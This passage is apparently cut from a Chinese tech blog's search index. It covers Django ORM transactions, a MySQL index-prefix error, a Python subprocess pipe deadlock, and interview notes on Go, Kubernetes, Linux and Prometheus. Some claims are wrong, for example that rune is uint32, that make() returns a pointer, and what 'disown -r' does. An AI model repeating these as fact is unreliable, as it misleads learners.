查询作者不是Phoenix 并且价格大于700\nmodels.Book.objects.filter(~Q(author__name=\u0026quot;Phoenix\u0026quot;) \u0026amp; Q(publishData__gt=\u0026quot;2021-08-04\u0026quot;))\rQ的第二种使用方法\nquery = Q()\rquery.connector = 'OR' #默认为and\rquery.children.append(('id', 1))\rquery.children.append(('id', 2))\rquery.children.append(('id', 3))\rmodels.Book.objects.filter(query)\r事务 Reference\ntransactions\n在操作多表，或多次变更数据时，这些数据的修改应该是一个整体事务，即要么一起成功，要么一起失败。Django 默认的事务行为是自动提交，即每执行一次则会自动提交到数据库。\n在django中事务的使用是通过django.db.transaction模块提供的atomic来定义事务。所以使用事务需要先引入from django.db import transaction\n事务的使用可以通过装饰器 或 with语句。\n通过装饰器方式（全局事务），在整个函数内为一个事务，要么一起成功，要么一起失败。\n@transaction.atomic\rdef test():\rmodels.Press.objects.create(name=\u0026quot;Yasgot\u0026quot;,address=\u0026quot;Nordische Botschaften\u0026quot;, email=\u0026quot;yasgot.com@gamil.com\u0026quot;)\rprint \u0026quot;insert ok.\u0026quot;\rtime.sleep(10)\rmodels.Press.objects.create(name=\u0026quot;Yasgot\u0026quot;,address=\u0026quot;Nordische Botschaften\u0026quot;, email=\u0026quot;yasgot.com@gamil.com\u0026quot;)\rbook = models.Press.objects.all()\rprint book\r通过with方式（局部事务），在函数中，使用 with transaction.atomic(): 代码块内的为一个事务。\ndef viewfunc(request):\rwith transaction.atomic():\r# 这部分代码会在事务中执行\r事务的异常处理 保存点 保存点（savepoint），在事务中可以做到部分回滚，而不是整个事务。\natomic() 为开启一个事务，而回滚是通过，transaction.rollback() 执行的完全回滚。而django也推荐仅使用atomic()。\nsavepoint(*using=None*)：创建新的保存点，返回保存点ID (sid) 。\nsavepoint_commit(*sid*, *using=None*)：释放保存点 sid 。如回滚等将不在保证之前的保存点的数据而是整个事务。\nsavepoint_rollback(*sid*, *using=None*):回滚事务 sid 。\n下面是官方的一个例子：example-to-savepoint\nfrom django.db import transaction\r# open a transaction\r@transaction.atomic\rdef viewfunc(request):\ra.save()\r# transaction now contains a.save()\rsid = transaction.savepoint()\rb.save()\r# transaction now contains a.save() and b.save()\rif want_to_keep_b:\rtransaction.savepoint_commit(sid)\r# open transaction still contains a.save() and b.save()\relse:\rtransaction.savepoint_rollback(sid)\r# open transaction now contains only a.save()\r执行原生SQL Reference raw-sql\nraw() :执行原生语句 django.db.models.query.RawQuerySet\ndjango.db.connection()：；连接多个库 from django.db import connection\n自定义字段类 Reference custom-filed\nclass FixedCharField(models.Field):\r\u0026quot;\u0026quot;\u0026quot;\r自定义的 char 类型的字段类\r\u0026quot;\u0026quot;\u0026quot;\rdef __init__(self, max_length, *args, **kwargs):\rself.max_length = max_length\rsuper(FixedCharField, self).__init__(max_length=max_length, *args, **kwargs)\rdef db_type(self, connection):\r\u0026quot;\u0026quot;\u0026quot;\r限定生成数据库表的字段类型为 char，长度为 max_length 指定的值\r\u0026quot;\u0026quot;\u0026quot;\rreturn 'char(%s)' % self.max_length\r","permalink":"https://www.oomkill.com/2021/10/django-orm/","summary":"","title":"django ORM"},{"content":" phenomenon： Specified key was too long; max key length is 3072 bytes\n在修改一个数据库字段时，字段容量被限制为了表前缀的大小而不是本身的容量大小\n查了一下innodb_large_prefix究竟是什么？\n动态行格式DYNAMIC row format 支持最大的索引前缀(3072)。由变量innodb_large_prefix进行控制。\nBy default, the index key prefix length limit is 767 bytes. See Section 13.1.13, “CREATE INDEX Statement”. For example, you might hit this limit with a column prefix index of more than 255 characters on a TEXT or VARCHAR column, assuming a utf8mb3 character set and the maximum of 3 bytes for each character. When the innodb_large_prefix configuration option is enabled, the index key prefix length limit is raised to 3072 bytes for InnoDB tables that use the DYNAMIC or COMPRESSED row format.\n官方上说在 utf8mb3（most bytes n）如果设置为 varchar(255)时，索引前缀将大于767，可以扩展为3072，但是实际上 varchar的size可以为65535，这个就限制了整个alter table 的操作\n因为建表是时索引没设置大小，默认是超过255的，后面开启了前缀限制，大小会为3072，此时无法做表修改\nReference\nUtf8mb4 / ERROR 1709 (HY000): Index column size too large. The maximum column size is 767 bytes MySQL8 innodb large prefix\ninnodb_file_format settings backwards compatible\ninnodb limits\n","permalink":"https://www.oomkill.com/2021/10/mysql5.6-innodb_large_prefix-abnormal/","summary":"","title":"mysql5.6 innodb_large_prefix引起的一个异常"},{"content":" sence：python中使用subprocess.Popen(cmd, stdout=sys.STDOUT, stderr=sys.STDERR, shell=True) ，stdout, stderr 为None.\n在错误中执行是无法捕获 stderr的内容，后面将上面的改为 subprocess.Popen(cmd, stdout=PIPE, stderr=PIPE, shell=True),发现是可以拿到 stderr, 但是会遇到大量任务hanging，造成线上事故。\n为此特意查询subprocess的一些参数的说明。\nstdin stdout stderr 如果这些参数为 PIPE, 此时会为一个文件句柄，而传入其他（例如 sys.stdout 、None 等）的则为None\n正如这里介绍的一样，subprocess 。\n而使用 PIPE，却导致程序 hanging。一般来说不推荐使用 stdout=PIPE stderr=PIPE，这样会导致一个死锁，子进程会将输入的内容输入到 pipe，直到操作系统从buffer中读取出输入的内容。\n查询手册可以看到确实是这个问题 Refernce\nWarning This will deadlock when using stdout=PIPE and/or stderr=PIPE and the child process generates enough output to a pipe such that it blocks waiting for the OS pipe buffer to accept more data. Use communicate() to avoid that.\n而在linux中 PIPE 的容量（capacity）是内核中具有固定大小的一块缓冲区，如果用来接收但不消费就会阻塞，所以当用来接收命令的输出基本上100% 阻塞所以会导致整个任务 hanging。（ -Linux2.6.11 ，pipe capacity 和system page size 一样（如， i386 为 4096 bytes ）。 since Linux 2.6.11+，pipe capacity 为 65536 bytes。）\n关于更多的信息可以参考：pipe\n所以如果既要拿到对应的输出进行格式化，又要防止程序hang，可以自己创建一个缓冲区，这样可以根据需求控制其容量，可以有效的避免hanging。列如：\ncmd = \u0026quot;this is complex command\u0026quot; outPipe = tempfile.SpooledTemporaryFile(bufsize=10*10000) fileno = outPipe.fileno() process = subprocess.Popen(cmd,stdout=fileno,stderr=fileno,shell=True) 另外，几个参数设置的不通的区别如下：\nstdout=None 为继承父进程的句柄，通俗来说为标准输出。\nstderr=STDOUT 重定向错误输出到标准输出\nstdout=PIPE 将标准输出到linux pipe\nReference subprocess\nsubprocess stderr/stdout field is None\nsubprocess-popen-hanging\npipe size\n","permalink":"https://www.oomkill.com/2021/10/pipe-size-problem/","summary":"","title":"由PIPE size 引起的线上故障"},{"content":"数据结构 数据类型总结 Go语言将数据类型分为四类：基础类型、复合类型、引用类型和接口类型。\n基础数据类型包括：\n基础类型： 布尔型、整型、浮点型、复数型、字符型、字符串型、错误类型。 复合数据类型包括： 指针、数组、切片、字典、通道、结构体、接口。 什么是反射 在计算机科学领域，反射是指一类应用，它们能够自描述和自控制。\n在go中，编译时不知道类型的情况下，可更新变量、运行时查看值、调用方法以及直接对他们的布局进行操作的机制，称为反射。\n场景：无法透视一个未知类型的时候，这时候就需要有反射来帮忙你处理，反射使用TypeOf和ValueOf函数从接口中获取目标对象的信息，轻松完成目的。\nrune与byte的区别 byte是uint8、rune为uint32，一个仅限于ascii码的值，一个支持更多的值。rune比byte能表达更多的数。 golang默认使用utf8编码，一个中文占用3字节，一个utf8数字占用1字节，utf8字母占用1字节 切片 切片的扩容：切片扩容，一般方式：上一次容量的2倍，超过1024字节，每次扩容上一次的1/4\n切片的截取：在截取时，capacity 不能超过原slice的 capacity\nnew() 与 make() 的区别 new(T) 和 make(T, args) 是Go语言内建函数，用来分配内存，但适用的类型不用。\nnew函数用于分配指定类型的零值对象，并返回指向其内存地址的指针。例如，new(int)将分配一个类型为int且值为0的对象，并返回一个指向该地址的指针。可以使用*运算符访问指针指向的值。 make函数用于创建和初始化内置类型（如map、slice、channel）的数据结构，并返回其指针。它比new函数更加复杂很多，因为它需要知道类型的大小和结构，以便为其分配内存并初始化其字段或元素。例如，make(map[string]int)将创建一个空的map。它有一个string类型的键和一个int类型的值。 nil切片和空切片指向的地址一样吗？ nil切片和空切片指向的地址==不一样==。nil空切片引用数组指针地址为0（无指向任何实际地址） 空切片的引用数组指针地址是有的，且固定为一个值 什么是Receiver Golang的Receiver是绑定function到特定type成为其method的一个参数，即一个function加了receiver就成为一个type的method。\n构体方法跟结构体指针方法的区别（Receiver和指针Receiver的区别） T 的方法集仅拥有 T Receiver。 *T 方法集则包含全部方法 (Receiver + *Receiver)。 sync.once 是 Golang package 中使方法只执行一次的对象实现，作用与 init 函数类似。但也有所不同\ninit 函数是在文件包首次被加载的时候执行，且只执行一次\nsync.Onc 是在代码运行中需要的时候执行，且只执行一次\n当一个函数不希望程序在一开始的时候就被执行的时候，我们可以使用 sync.Once\n实现：sync.Once 的源码实现非常简单，采用的是双重检测锁机制 (Double-checked Locking)，是并发场景下懒汉式单例模式的一种实现方式\n首先判断 done 是否等于 0，等于 0 则表示回调函数还未被执行 加锁，确保并发安全 在执行函数前，二次确认 done 是否等于 0，等于 0 则执行 将 done 置 1，同时释放锁 疑问一: 为什么不使用乐观锁 CAS 简单的来说就是 f() 的执行结果最终可能是不成功的，所以你会看到现在采用的是双重检测锁机制来实现，同时需要等 f() 执行完成才修改 done 值 疑问二: 为什么读取 done 值的方式没有统一 比较 done 是否等于 0，为什么有的地方用的是 atomic.LoadUint32，有的地方用的却是 o.done。主要原因是 atomic.LoadUint32 可以保证原子读取到 done 值，是并发安全的，而在 doSlow 中，已经加锁了，那么临界区就是并发安全的，使用 o.done 就可以来读取值就可以了 原子操作和互斥锁的区别 文档：https://zhuanlan.zhihu.com/p/147618421\nGMP模型 文档：https://zhuanlan.zhihu.com/p/261590663 文档：https://juejin.cn/post/6844904104343388168\nG：goroutine\nM：Machine，内核线程\nP：Logical Processor，处理器；代表了M所需要的上下文环境\nruntime.GOMAXPROCS (numLogicalProcessors)可以设置多少个处理器，go 1.5开始，默认是CPU核数； 实际运行时P和CPU核心数并无任何关联，P最大不超过256；P可以理解为并行度的多少，也就是说当前最多只能有P个线程在运行；(是不是很像线程池) P一旦初始化了，就不能修改了 三者关系 M的数量和P不一定匹配，可以设置很多M，M和P绑定后才可运行，多余的M处于休眠状态。\nP包含一个LRQ（Local Run Queue）本地运行队列，这里面保存着P需要执行的协程G的队列。\n除了每个P自身保存的G的队列外，调度器还拥有一个全局的G队列GRQ（Global Run Queue），这个队列存储的是所有未分配的协程G。\ngo func()执行流程 创建一个G对象，加入到本地队列或全局队列； 如果还有空闲的P，则创建一个M； M会启动一个底层线程，并结合P，循环执行G； P执行G的顺序是，先从本地队列找，没有则到全局队列找（一次性转移[全局G个数/P个数]），再到其他P中找（一次性转移一半）； G是执行顺序是按照队列顺序的； P管理着G队列，但是G要运行，还需要M的绑定； runtime.GOMAXPROCS只会影响P的数量，不会影响M的数量； P和M的关系，就好比用户线程和内核线程的N：M模型； 没有足够的M关联P时，会创建M；在runtime执行系统监控或垃圾回收等任务的时候也会导致新的M的创建。 所以，runtime.GOMAXPROCS只是类似线程池的大小设置而已； 当然，go也可以通过runtime/debug.SeMaxThreads限制操作系统线程数；SetMaxThreads主要用于限制程序无限制的创造线程导致的灾难。目的是让程序在干掉操作系统之前，先干掉它自己。 goroutine是按照抢占式调度的，一个goroutine最多执行10ms就会换作下一个； 死锁 死锁是：多个进（线）程是相互竞争的关系，并且互持资源，相互等待，这样产生的永久阻塞的现象称为死锁。\n死锁产生的原因：\n互斥 占有且等待 不可抢占 循环等待 死锁如何解决：死锁的发生很难通过人为干预来解决，只能避免（打破死锁产生的条件）\n互斥：线程安全是通过互斥来实现的（无法干预） 占有且等待：申请资源时获取所有所需资源 不可抢占：占用资源的进程在进一步申请其他资源时，如申请不到主动释放已占有的资源 循环等待：按需预防，对所需资源进行排序，按照大小依次申请 Refer deadlock\nGo中产生死锁的原因：\n无缓冲；解决：缓冲或先读后写 缓冲已满（只写不读）；解决，需要有消费端 读写互斥；（读写加锁导致一段阻塞变成死锁） 未初始化的channel（读，写，关闭） 多线程只要保证个线程的执行，可以允许死锁 如主进程只读不写造成阻塞，这种情况在没有子线程情况下是死锁 slice和map区别 slice是有序的，map是无序的，在每次迭代时，无法确定其顺序 slice有容量，map没有容量，map是由go内部控制的数据结构 slice可以使用appen()，map不可以 slice和map都是引用类型，当作为参数传递时共享相同地址 如何复制slice、map和interface？ 这些类型的变量是内存引用类型，可以使用内置函数 copy() 来完成复制 Refer to\na := []int{1, 2} b := []int{3, 4} check := a copy(a, b) fmt.Println(a, b, check) // Output: [3 4] [3 4] [3 4] 什么是goroutine go的多线程是包含在运行时内的一种机制，用的模型是两级，即runtime帮助申请和释放线程，而这个gorutine可以为一对一，也可以为一对多，即操作系统中的 “两级模型”（Two-Level）是严格意义上的多对多模型，可以为单个用户线程专门一对一绑定内核线程的能力的模型\n用户线程的缺点：\n用户级线程与操作系统的集成度不高；如用空闲线程调度进程，阻塞其线程发起 I/O 的进程，即使该进程有其他线程可以运行，以及有锁的线程取消调度进程。 用户级线程需要非阻塞系统调用，否则，当一个线程阻塞，即使进程中还有可运行的线程，整个进程也会在内核中阻塞。例如，如果一个线程导致页面错误，则进程阻塞。 用户线程和操作系统内核之间缺乏协调性；无论进程有 1 个线程还是 1000 个线程，都仅能获得一个CPU时间片。由每个线程主动将控制权交给其他线程。 由于进程时资源分配的最小单位，多线程情况下，每个线程得到的时间片较少，执行会较慢。 C语言的线程和Goroutine的区别主要表现在以下几个方面 实现方式不同：C语言的线程是由操作系统内核来实现的，而Goroutine则是通过Go语言的runtime来实现的。 内存分配方式不同：C语言的线程需要在内存中分配一定的栈空间，而Goroutine则通过自动扩展栈来实现。 调度方式不同：C语言的线程是由操作系统内核来调度的，而Goroutine是通过Go语言的runtime自己实现的调度器来调度的。 轻量级：Goroutine是轻量级的线程，一个Goroutine只需要2KB的栈空间，而C语言的线程需要占用更多的内存空间。 效率高：由于Goroutine是由Go语言的runtime来实现的，因此它具有非常高的执行效率和并发性能，比C语言的线程更加高效。 总的来说，Goroutine是Go语言的并发特性中非常重要的一部分，通过Goroutine可以非常方便地实现高效的并发程序。而C语言的线程则更多地是由操作系统来实现，对于一些需要最大化利用机器性能的场景会更为适合。\n应用 Go语言创建TCP连接 conn.dial conn.write/read ","permalink":"https://www.oomkill.com/2021/10/interview-go/","summary":"","title":"go面试题收集"},{"content":"Kubernetes概念 Ingress和LoadBalancer的区别 Ingress通常用于将HTTP(S)流量路由到Kubernetes群集内部的服务，支持复杂路径路由和负载均衡算法 LB则是通过提供商提供一种外部流量引入到集群内的组件，通常为2 3层 Ingress本身是基于service的，引入流量时依赖 kube-proxy LB则是独立的组件，最小接入单元也是service，而通过2 3层的广播等功能可以提供多节点的引入 功能：Ingress是一个规范，LB则是一种实现 实现方式：ingress通过扩展Kubernetes API+controller, 而LB除此外还需要外部设备提供（软硬件，云组件） kubernetes之最小单元 Pod最小可调度单元，最小部署单元 容器：容器是最小的执行单元 Namespace：最小隔离单元 Service：最小接入单元 etcd用的什么算法，简单解释一下 raft算法 强一致性 同一时间只能有一个leader,所有的操作都在leader上。\nPod 的生命周期 Pod 状态始终处于一下几个状态之一:\nPending: 部署 Pod 事务已被集群受理，但当前容器镜像还未下载完或现有资源无法满足 Pod 的资源需求 Running: 所有容器已被创建，并被部署到节点上 Successed: Pod 成功退出，并不会被重启 Failed: Pod 中有容器被终止 Unknown: 未知原因，如 kube-apiserver 无法与 Pod 进行通讯 Kubernetes有哪些不同类型的服务？ cluster ip Node Port Load Balancer Extrenal Name 什么是ETCD？ Etcd是用Go编程语言编写的，是一个分布式键值存储，用于协调分布式工作。因此，Etcd存储Kubernetes集群的配置数据，表示在任何给定时间点的集群状态。\n什么是Ingress网络，它是如何工作的？ Ingress网络是一组规则，充当Kubernetes集群的入口点。这允许入站连接，可以将其配置为通过可访问的URL，负载平衡流量或通过提供基于名称的虚拟主机从外部提供服务。因此，Ingress是一个API对象，通常通过HTTP管理集群中服务的外部访问，是暴露服务的最有效方式。\n什么是Headless Service？ Headless Service类似于“普通”服务，但没有群集IP。此服务使您可以直接访问pod，而无需通过代理访问它。\n什么是集群联邦？ 在联邦集群的帮助下，可以将多个Kubernetes集群作为单个集群进行管理。因此，您可以在数据中心/云中创建多个Kubernetes集群，并使用联邦来在一个位置控制/管理它们。\n联合集群可以通过执行以下两项操作来实现此目的。请参考下图。\nkube-proxy的作用 kube-proxy运行在所有节点上，它监听apiserver中service和endpoint的变化情况，创建路由规则以提供服务IP和负载均衡功能。简单理解此进程是Service的透明代理兼负载均衡器，其核心功能是将到某个Service的访问请求转发到后端的多个Pod实例上。\nkube-proxy iptables的原理 Kubernetes从1.2版本开始，将iptables作为kube-proxy的默认模式。iptables模式下的kube-proxy不再起到Proxy的作用，其核心功能：通过API Server的Watch接口实时跟踪Service与Endpoint的变更信息，并更新对应的iptables规则，Client的请求流量则通过iptables的NAT机制“直接路由”到目标Pod。\nkube-proxy ipvs的原理 IPVS在Kubernetes1.11中升级为GA稳定版。IPVS则专门用于高性能负载均衡，并使用更高效的数据结构（Hash表），允许几乎无限的规模扩张，因此被kube-proxy采纳为最新模式。\n在IPVS模式下，使用iptables的扩展ipset，而不是直接调用iptables来生成规则链。iptables规则链是一个线性的数据结构，ipset则引入了带索引的数据结构，因此当规则很多时，也可以很高效地查找和匹配。\n可以将ipset简单理解为一个IP（段）的集合，这个集合的内容可以是IP地址、IP网段、端口等，iptables可以直接添加规则对这个“可变的集合”进行操作，这样做的好处在于可以大大减少iptables规则的数量，从而减少性能损耗。\nkube-proxy ipvs和iptables的异同 iptables与IPVS都是基于Netfilter实现的，但因为定位不同，二者有着本质的差别：iptables是为防火墙而设计的；IPVS则专门用于高性能负载均衡，并使用更高效的数据结构（Hash表），允许几乎无限的规模扩张。\n与iptables相比，IPVS拥有以下明显优势：\n为大型集群提供了更好的可扩展性和性能； 支持比iptables更复杂的复制均衡算法（最小负载、最少连接、加权等）； 支持服务器健康检查和连接重试等功能； 可以动态修改ipset的集合，即使iptables的规则正在使用这个集合。 Kubernetes镜像的下载策略 Kubernetes的镜像下载策略有三种：Always、Never、IFNotPresent。\nAlways：镜像标签为latest时，总是从指定的仓库中获取镜像。 Never：禁止从仓库中下载镜像，也就是说只能使用本地镜像。 IfNotPresent：仅当本地没有对应镜像时，才从目标仓库中下载。默认的镜像下载策略是：当镜像标签是latest时，默认策略是Always；当镜像标签是自定义时（也就是标签不是latest），那么默认策略是IfNotPresent。 简述Kubernetes Scheduler使用哪两种算法将Pod绑定到worker节点 Kubernetes Scheduler根据如下两种调度算法将 Pod 绑定到最合适的工作节点：\n预选（Predicates）：输入是所有节点，输出是满足预选条件的节点。kube-scheduler根据预选策略过滤掉不满足策略的Nodes。如果某节点的资源不足或者不满足预选策略的条件则无法通过预选。如“Node的label必须与Pod的Selector一致”。 优选（Priorities）：输入是预选阶段筛选出的节点，优选会根据优先策略为通过预选的Nodes进行打分排名，选择得分最高的Node。例如，资源越富裕、负载越小的Node可能具有越高的排名。 有了解过qos吗？ 怎么实现的？ 服务质量 Quality of Service有三种 Guaranteed, Burstable, and Best-Effort，它们的QoS级别依次递减。\nGuaranteed：确保的，只设置 limits 或者 requests 与 limits 为相同时则为该等级 Burstable：可突发的，只设置 requests 或 requests 低于 limits 的场景 Best-effort： 默认值，如果不设置则为这个等级 node资源不足时会按qos级别驱逐pod。 最先驱逐的是Best-Effort ,重要组件一定要设置limit和request.\n驱逐顺序根据 BestEffort ==》Burstable ==》Guaranteed 进行驱逐\nKubernetes 开发 资源和类型 Kind：实体的类型\nresources：resources是，restful中的资源，标识一组HTTP端点（paths），可以理解为kind的实例化。\n例如：Pod是etcd中的数据，而resources对应的 path上的resources\nResources和kinds区别 Resources与HTTP paths关联， Resources始终是API Group和Version的一部分。 kind是这些endpoint返回并接收的objects的类型，并持久存在于etcd中。 Kubernetes OOP Kind Class Resource Object Kind 其实就是一个类，用于描述对象的；而 Resource 就是具体的 Kind，可以理解成类已经实例化成对象了。\nGVR与GVK有什么区别？ GVR = Group Version Resources GVK = Group Version Kind 每个kind都属于一个Group和Version中，通过GVK标识，GVR是GVK对外提供服务的入口，GVK与GVR之间的映射过程交 REST mapping\nclient-go 客户端类型有哪些？ RestClient：是最基础的客户端，其作用是将http client进行封装成rest api格式。位于rest目录 ClientSet：基于RestClient进行封装对 Resource 与 version 管理集合， DiscoverySet：RestClient进行封装，可动态发现kube-apiserver所支持的GVR（Group Version Resource）。 ：基于RestClient，包含动态的客户端，可以对Kubernetes所支持的 API对象进行操作，包括CRD。 kubernetes 调度过程 kubernetes调度过程就是调度上下文，而调度上下文就是执行 scheduleOne 这个函数中线性执行的。\n调度上下文的过程分为两阶段，调度和绑定\n调度：指的是SchedulePod -\u0026gt; findNodesThatFitPod 这是 prefilter 阶段，如果通过 prefilter\nprefilter 做预检查动作，如获取node列表，检查提名node是否满足，满足则评估，不满足则从PreFilterPlugins获取node list，满足所有条件执行 filter plugin；PreFilterPlugins返回的是一组Node name\nfilter 做过滤操作，满足的条件是至少配置了一个filter plugin，filter是线性的，如一个扩展不满足则标记为不可用\npostFilter 是抢占的触发条件，即filter阶段没有FN时被触发，满足条件是需要配置至少一个该类型plugin\n这里存在 Unschedulable 不可调用则执行postfilter，否则都不可调用 preScore, score 会在 prioritizeNodes 中执行对应的 插件\n接下来是 Reserve, 为了避免Pod在绑定到节点前时，调度一个新的Pod，使节点使用资源超过可用资源情况。\nPremit ，阻止或延迟 Pod 的绑定\n绑定：绑定操作时异步进行的，即通过了打分阶段，基本上等于调度成功\n这个异步线程会从延迟队列中拿到调度的pod，即Premit 的延迟 这里关联的上面的reserve 与 premit，如果不可调用则调用unreserved回滚，否则会调用 bind prebind 与 bind 的失败都会放入到回滚队列中 bind 当 执行了unreserve 则忘记这个pod 否则成功的绑定了node client-go的架构 Reflector deltafifo的生产者 就是将 （监控）Etcd 里面的数据反射到本地存储（DeltaFIFO）中\ndeltaFIFO， Delta 表示的是变化的资源对象存储 先进先出的队列\nworkqueue kubernetes中使用的队列，即每次触发的事件都被塞入到queue中进行处理\n去重 delay：如 cronjob 依赖延迟队列实现定时功能 限速： Indexer deltaFIFO消费者，是Informer的本地存储。\nworkqueue算法实现 已知workqueue主要作用是为了去重，延迟，限速，那么他是通过什么算法实现的呢？\n延迟主要使用了 Binary Heap 数据类型实现的延迟，而这种queue称为优先级队列 Heap是一个二叉树数据结构，即每个节点包含的元素大于或等于该节点子节点的元素，如果新元素的值大于父元素，将新元素与父元素交换，直到达到新元素到根，这个过程叫向上调整 元素被放置在结构中时，按照优先级排列 优先级最高的元素最先离开 限速队列时在延迟队列的基础上扩展的，使用的令牌桶和漏桶算法实现的 kube-proxy作用 kube-proxy作用是位于工作节点上，通过ipvs提供service功能，本质上来说是一个controller，通过监听 node, endpoints， service等资源的变动从而生成proixer的规则\n什么是endpointslice Endpoints 与 EndpointSlices 均是为service提供端点的 Service规模越大，那么Endpoints中的 Pod 数量越大，传输的 EndPoints 对象就越大。集群中 Pod 更改的频率越高，也意味着传输在网络中发生的频率就越高 Endpoints 对象在大规模集群场景下存在下列问题： 增加网络流量（etcd最大请求大小为 1.5 MiB），隐性增加对控制平面的影响，service的可扩展性将降低 超大规模的 service 理论上会无法存储 该 Endpoints 处理Endpoints资源的 worker 会消耗更多的计算资源 Endpointslices 解决了： 部分更新，更少的网络流量 Worker 处理 Endpoints 更新所需的资源更少 减少对控制平面的影响，提升的性能和 service 规模 ","permalink":"https://www.oomkill.com/2021/10/interview-kubernetes/","summary":"","title":"kubernetes面试题收集"},{"content":"Linux 基础 守护、僵⼫、孤⼉进程的概念 【答】\n守护进程：运⾏在后台的⼀种特殊进程，独⽴于控制终端并周期性地执⾏某些任务。 僵⼫进程：⼀个进程 fork ⼦进程，⼦进程退出，⽽⽗进程没有 wait/waitpid⼦进程，那么⼦进程的进程描述符仍保存在系统中，这样的进程称为僵⼫进程。 孤⼉进程：⼀个⽗进程退出，⽽它的⼀个或多个⼦进程还在运⾏，这些⼦进程称为孤⼉进程。（孤⼉进程将由 init 进程收养并对它们完成状态收集⼯作） 进程间通讯方式有哪些？ Pipe：无名管道，最基本的IPC，单向通信，仅在父/子进程之间，也就是将一个程序的输出直接交给另一个程序的输入。常见使用为 ps -ef|grep xxx FIFO [(First in, First out)] 或 有名管道（named pipe）:与Pipe不同，FIFO可以让两个不相关的进程可以使用FIFO。单向。 Socket 和 Unix Domain Socket：socket和Unix套接字，双向。适用于网络通信，但也可以在本地使用。适用于不同的协议。 消息队列 Message Queue: SysV 消息队列、POSIX 消息队列。 Signal: 信号，是发送到正在运行的进程通知以触发其事件的特定行为，是IPC的一种有限形式。 Semaphore：信号量，通常用于IPC或同一进程内的线程间通信。他们之间使用队列进行消息传递、控制或内容的传递。（常见SysV 信号量、POSIX 信号量） Shared memory：（常见SysV 共享内存、POSIX 共享内存）。共享内存，是在进程（程序）之间传递数据的有效方式，目的是在其之间提供通信。 BASH和DOS控制台之间的主要区别在于3个方面： 答案：\nBASH命令区分大小写，而DOS命令则不区分; 在BASH下，/ character是目录分隔符，\\ 作为转义字符。在DOS下，/ 用作命令参数分隔符，\\ 是目录分隔符 DOS遵循命名文件中的约定，即8个字符的文件名后跟一个点，扩展名为3个字符。BASH没有遵循这样的惯例。 Linux 中进程有哪几种状态？在 ps 显示出来的信息中，分别用什么符号表示的？ 答案：\nR runnable (on run queue) 运行 (正在运行或在运行队列中等待)\nS 中断 sleeping(休眠中, 受阻, 在等待某个条件的形成或接受到信号)\nD 不可中断 uninterruptible sleep (usually IO)(收到信号不唤醒和不可运行, 进程必须等待直到有中断发生)\nZ 僵尸 a defunct (”zombie”) process (进程已终止, 但进程描述符存在, 直到父进程调用wait4()系统调用后释放)\nT 停止 traced or stopped (进程收到SIGSTOP, SIGSTP, SIGTIN, SIGTOU信号后停止运行运行)\n系统目前有许多正在运行的任务，在不重启机器的条件下，有什么方法可以把所有正在运行的进程移除呢？ 答案：使用linux命令 ’disown -r ’可以将所有正在运行的进程移除。\nLinux 粘滞位作用 答案：\n粘滞位(sticky bit)权限是针对目录的，对文件无效，设置了sticky位表示这个目录里的文件只能被owner和root删除。\n什么是inode？ 答案：\ninode是Linux(Unix)操作系统中文件系统的一个概念。inode的全称为index node，也就是索引节点。那么inode是用来索引什么的呢？其实inode表示的是一个文件，它是用来索引文件数据的。\n磁盘报错”No space left on device”，但是通过命令df –h查看磁盘空间没有满，请问为什么？ 答案：\n该磁盘的inode数量被用尽，无法再写入文件。 企业工作中邮件临时队列 /var/spool/clientmquene或/var/spool/postfix/maildrop这里很容易被大量小文件占满导致No space left on device的错误。clientmquene目录只有安装了sendmail服务，才会有，是sendmail的临时队列。\n一个100M的磁盘分区，分别写入1K的文件，及写入1M的文件，分别可以写多少个？ 答案：\n在linux文件系统中，iNode用来存放文件的属性信息，而Block用来存放文件实际内容，默认大小1K(boot)或4K(非系统分区默认为4k)。\n写入1M文件的数量为100/1，且不会存在磁盘浪费情况（这也说明了一般情况下，inode和block的数量都是足够的）；\n而写入1K文件时，inode和block同时被消耗，但一般block数量远大于inode的数量，因此写入的数量就是inode的数量，并且这样会浪费3/4的磁盘容量。\nnohup nohup 执行会忽略信号 SIGHUP，并将 stdout/stderr 重定向到文件 nohup.out。以便shell在关闭或注销后命令可以在后台继续运行 。nohup做的工作就是让 nohup 后的命令不在是当前 shell 的子命令。而是PPID=1的进程（进程的PPID=1）。这种情况下不能被带回到前台。\nsignal (SIGHUP, SIG_IGN); // 忽略信号SIGHUP char **cmd = argv + optind; execvp (*cmd, cmd); // 在执行这个命令，而不是当前shell 对于输出的重定向，对于STDOUT/STDERR会忽略，然后写入到 nohup.out\nignoring_input = isatty (STDIN_FILENO); redirecting_stdout = isatty (STDOUT_FILENO); stdout_is_closed = (!redirecting_stdout \u0026amp;\u0026amp; errno == EBADF); redirecting_stderr = isatty (STDERR_FILENO); /* If standard input is a tty, replace it with /dev/null if possible. Note that it is deliberately opened for *writing*, to ensure any read evokes an error. */ if (ignoring_input) { if (fd_reopen (STDIN_FILENO, \u0026quot;/dev/null\u0026quot;, O_WRONLY, 0) \u0026lt; 0) error (exit_internal_failure, errno, _(\u0026quot;failed to render standard input unusable\u0026quot;)); if (!redirecting_stdout \u0026amp;\u0026amp; !redirecting_stderr) error (0, 0, _(\u0026quot;ignoring input\u0026quot;)); } /* If standard output is a tty, redirect it (appending) to a file. First try nohup.out, then $HOME/nohup.out. If standard error is a tty and standard output is closed, open nohup.out or $HOME/nohup.out without redirecting anything. */ if (redirecting_stdout || (redirecting_stderr \u0026amp;\u0026amp; stdout_is_closed)) { char *in_home = NULL; char const *file = \u0026quot;nohup.out\u0026quot;; int flags = O_CREAT | O_WRONLY | O_APPEND; mode_t mode = S_IRUSR | S_IWUSR; mode_t umask_value = umask (~mode); out_fd = (redirecting_stdout ? fd_reopen (STDOUT_FILENO, file, flags, mode) : open (file, flags, mode)); Referece what is the function of the nohup command\n","permalink":"https://www.oomkill.com/2021/10/interview-linux/","summary":"","title":"操作系统类面试题收集"},{"content":"Prometheus的四种数据类型 Counter(计数器类型) Counter类型的指标的工作方式和计数器一样，只增不减 Gauge(仪表盘类型) Gauge是可增可减的指标类，通常用于反应当前应用的状态。 Histogram 主要用于表示一段时间范围内对数据进行采样 Summary(摘要类型) Summary类型和Histogram类型相似，主要用于表示一段时间内数据采样结果 Prometheus 的局限 Prometheus 是基于 Metric 的监控，不适用于日志（Logs）、事件(Event)、调用链(Tracing)。 Prometheus 默认是 Pull 模型，合理规划你的网络，尽量不要转发。对于集群化和水平扩展，官方和社区都没有银弹，需要合理选择 Federate、Cortex、Thanos等方案。 监控系统一般情况下可用性大于一致性，容忍部分副本数据丢失，保证查询请求成功。这个后面说Thanos 去重的时候会提到。 Prometheus 